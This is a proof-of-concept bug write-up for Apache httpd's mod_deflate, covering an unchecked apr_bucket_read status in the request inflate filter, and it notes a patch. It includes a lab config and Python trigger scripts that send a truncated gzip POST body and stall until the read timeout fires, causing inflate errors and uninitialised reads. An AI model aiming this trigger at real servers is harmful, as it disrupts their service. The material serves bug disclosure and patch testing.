# PoC 124 - Unchecked apr_bucket_read in deflate_in_filter

The `mod_deflate` request inflate path consumes `data`/`len` from
`apr_bucket_read()` without checking the status, so a failing upstream read
can drive zlib with stale state.

## Setup

Lab httpd 2.4.66 with `mod_deflate`, `mod_reqtimeout`, and a CGI sink. We
trip the upstream socket-bucket read by trickling a partial gzip body slowly
enough to fire `RequestReadTimeout`.

`conf/httpd.conf`:

```
ServerName localhost
Listen 127.0.0.1:8080
LoadModule mpm_event_module      modules/mod_mpm_event.so
LoadModule authz_core_module     modules/mod_authz_core.so
LoadModule deflate_module        modules/mod_deflate.so
LoadModule reqtimeout_module     modules/mod_reqtimeout.so
LoadModule cgid_module           modules/mod_cgid.so
LoadModule mime_module           modules/mod_mime.so
LoadModule unixd_module          modules/mod_unixd.so
LoadModule log_config_module     modules/mod_log_config.so

ErrorLog logs/error_log
LogLevel deflate:trace4 reqtimeout:trace2
TypesConfig conf/mime.types
AddHandler cgi-script .cgi
ScriptSock cgisock

RequestReadTimeout body=2,minrate=1
SetInputFilter DEFLATE

DocumentRoot "/tmp/htdocs"
<Directory "/tmp/htdocs">
    Require all granted
    Options +ExecCGI
</Directory>
```

`/tmp/htdocs/sink.cgi`:

```sh
#!/bin/sh
echo "Content-Type: text/plain"
echo
cat
```

Run httpd under a memory checker to surface invalid reads:

```
valgrind --error-exitcode=42 ./httpd -X -d $PWD
```

## Trigger

Build a valid gzip prefix of a longer payload so the inflate loop is already
running when the next bucket read fails.

```
python3 -c '
import gzip, sys
buf = gzip.compress(b"A"*4096)
sys.stdout.buffer.write(buf[:24])
' > /tmp/gz_head.bin
```

Open a raw connection, send headers plus the gzip prefix, then stall:

```
python3 - <<'PY'
import socket, time
s = socket.create_connection(("127.0.0.1", 8080))
hdr = (b"POST /sink.cgi HTTP/1.1\r\n"
       b"Host: localhost\r\n"
       b"Content-Encoding: gzip\r\n"
       b"Content-Length: 4096\r\n"
       b"Connection: close\r\n\r\n")
s.sendall(hdr + open("/tmp/gz_head.bin","rb").read())
time.sleep(8)
print(s.recv(4096))
PY
```

## Observed effect

`reqtimeout` aborts the body read after 2 s. The socket bucket returns a
non-`APR_SUCCESS` status to `deflate_in_filter()`, but `data` and `len` are
consumed regardless. Behaviour observed:

- `error_log` shows `AH01383` decompression errors or `inflate error -3` (data
  error) coming from values that were never validated.
- Under `valgrind`/ASan, the failing run can flag a use of uninitialised
  `len` value when the stack memory feeding `data`/`len` was reused by another
  filter on the same brigade.
- A subsequent successful request on a child reused after a failure
  occasionally returns 500 with `AH01387`, indicating `ctx->stream` was not
  cleanly torn down because the failure path skipped `inflateEnd()`.

After applying the patch the same trigger produces a clean `408` and the
zlib stream is closed via `inflateEnd()` before the filter returns.
